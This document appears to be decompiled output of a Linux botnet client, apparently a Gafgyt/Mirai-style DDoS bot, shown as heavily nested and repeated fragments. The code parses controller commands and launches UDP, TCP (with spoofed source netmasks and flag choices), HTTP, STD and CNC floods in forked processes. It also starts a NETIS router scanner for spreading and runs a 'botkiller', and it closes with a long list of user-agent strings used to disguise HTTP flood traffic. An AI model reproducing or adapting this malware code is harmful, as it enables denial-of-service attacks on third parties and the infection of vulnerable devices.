                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                            if (listFork() == 0) {
                                                                                                                sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendCNC(v153, v151, v152, 0);
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendSTD(v160, v158, v159, 0);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendSTD(v160, v158, v159, 0);
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                    sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                    sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendSTD(v160, v158, v159, 0);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                        sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendCNC(v153, v151, v152, 0);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                            sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendCNC(v153, v151, v152, 0);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                        sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendUDP(v99, v114, v115, v116, v117, v97, v103, v102);
                                                        sockprintf(v92, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                        sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                        sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                    if (listFork() == 0) {
                                                                                        sendTCP(v140, v121, v122, v123, v141, v100, v101);
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendCNC(v153, v151, v152, 0);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                            while (true) {
                                                                                                if (listFork() == 0) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendCNC(v153, v151, v152, 0);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                        sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v153, v151, v152, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                    sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                            sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                    if (listFork() == 0) {
                                                                        sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                            if (listFork() == 0) {
                                                                                                sendCNC(v153, v151, v152, 0);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                            sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                                                    if (listFork() == 0) {
                                                                                        sendCNC(v153, v151, v152, 0);
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                    sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                if (listFork() == 0) {
                                                                                    sendCNC(v153, v151, v152, 0);
                                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                    if (listFork() == 0) {
                                        __GI_inet_ntoa(v95);
                                        v144 = sockprintf(v92, (int32_t)"COMMENCING BOT KILL ON -> %s");
                                        botkiller(v144);
                                if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                                    __GI_inet_ntoa(v95);
                                    sockprintf(v92, (int32_t)"My Public IP: %s");
                                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                                sockprintf(v92, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v133, v114, v115, v116, v117, v97, v103, v102);
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                                                sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                                            if (listFork() == 0) {
                                                                                                                sendTCP(v140, v121, v122, v123, v141, v100, v101);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendCNC(v153, v151, v152, 0);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                        sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendCNC(v153, v151, v152, 0);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendCNC(v153, v151, v152, 0);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                            sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                    sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendCNC(v153, v151, v152, 0);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                    sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                            if (listFork() == 0) {
                                                                                                                sendCNC(v153, v151, v152, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                            sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                        if (listFork() == 0) {
                                                                                                            sendCNC(v153, v151, v152, 0);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                        sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                        sockprintf(v92, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                        sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                        sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                    if (listFork() == 0) {
                                                                        sendTCP(v140, v121, v122, v123, v141, v100, v101);
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                if (listFork() == 0) {
                                                                                                    sendCNC(v153, v151, v152, 0);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                                sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                        if (listFork() == 0) {
                                                                                            sendCNC(v153, v151, v152, 0);
                                                                                            while (true) {
                                                                                                if (listFork() == 0) {
                                                                        sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                    if (listFork() == 0) {
                                                                                        sendCNC(v153, v151, v152, 0);
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                    sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                            sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                    if (listFork() == 0) {
                                                        sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                        while (true) {
                                                            if (listFork() == 0) {
                if (__GI_strcoll((char *)*a2, (int32_t)"NETIS") == 0) {
                        kill(v131, 9);
                        __GI_inet_ntoa(v95);
                        sockprintf(v92, (int32_t)"STOPPING NETIS SCANNER");
                            v104 = __libc_fork();
                                __GI_inet_ntoa(v95);
                                v143 = sockprintf(v92, (int32_t)"STARTING NETIS SCANNER");
                                NetisScanner(v143);
                                    if (listFork() == 0) {
                                        __GI_inet_ntoa(v95);
                                        v144 = sockprintf(v92, (int32_t)"COMMENCING BOT KILL ON -> %s");
                                        botkiller(v144);
                                if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                                    __GI_inet_ntoa(v95);
                                    sockprintf(v92, (int32_t)"My Public IP: %s");
                                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                                sockprintf(v92, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v133, v114, v115, v116, v117, v97, v103, v102);
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                                                sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                                            if (listFork() == 0) {
                                                                                                                sendTCP(v140, v121, v122, v123, v141, v100, v101);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                    sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                        sockprintf(v92, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                        sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                        sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                    if (listFork() == 0) {
                                                                        sendTCP(v140, v121, v122, v123, v141, v100, v101);
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                            sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                    if (listFork() == 0) {
                                                        sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                        while (true) {
                                                            if (listFork() == 0) {
                    if (listFork() == 0) {
                        __GI_inet_ntoa(v95);
                        v144 = sockprintf(v92, (int32_t)"COMMENCING BOT KILL ON -> %s");
                        botkiller(v144);
                if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                    __GI_inet_ntoa(v95);
                    sockprintf(v92, (int32_t)"My Public IP: %s");
                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                sockprintf(v92, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                            if (listFork() == 0) {
                                                                sendUDP(v133, v114, v115, v116, v117, v97, v103, v102);
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                                sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                            if (listFork() == 0) {
                                                                                                sendTCP(v140, v121, v122, v123, v141, v100, v101);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                    sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                            if (listFork() == 0) {
                                                                                sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                while (true) {
                                                                    if (listFork() == 0) {
                        sockprintf(v92, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                        sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                        sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                    if (listFork() == 0) {
                                                        sendTCP(v140, v121, v122, v123, v141, v100, v101);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                            while (true) {
                                                                if (listFork() == 0) {
                            sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                    if (listFork() == 0) {
                                        sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                        while (true) {
                                            if (listFork() == 0) {
=================FUNCTION : _init ===================
++++++++ FUNCTION START 394
++++++++ FUNCTION END 1319
++++++++ FUNCTION LENGTH 925
        "etrbhhgetrb",
        "close",
        "accept"
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
        "Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
        "Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/",
        "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
        "zspider/0.9-dev http://feedback.redkolibri.com/",
        "Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
        "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
        "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
        "TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
        "FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
        "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
        "Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0",
        "Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
        "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
        "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
        "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
        "MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
        "Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
        "Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)",
        "NetResearchServer/4.0(loopimprovements.com/robot.html)",
        "NetResearchServer/3.5(loopimprovements.com/robot.html)",
        "NetResearchServer/2.8(loopimprovements.com/robot.html)",
        "NetResearchServer/2.7(loopimprovements.com/robot.html)",
        "NetResearchServer/2.5(loopimprovements.com/robot.html)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
        "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET ",
        "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Gigabot/3.0 (http://www.gigablast.com/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
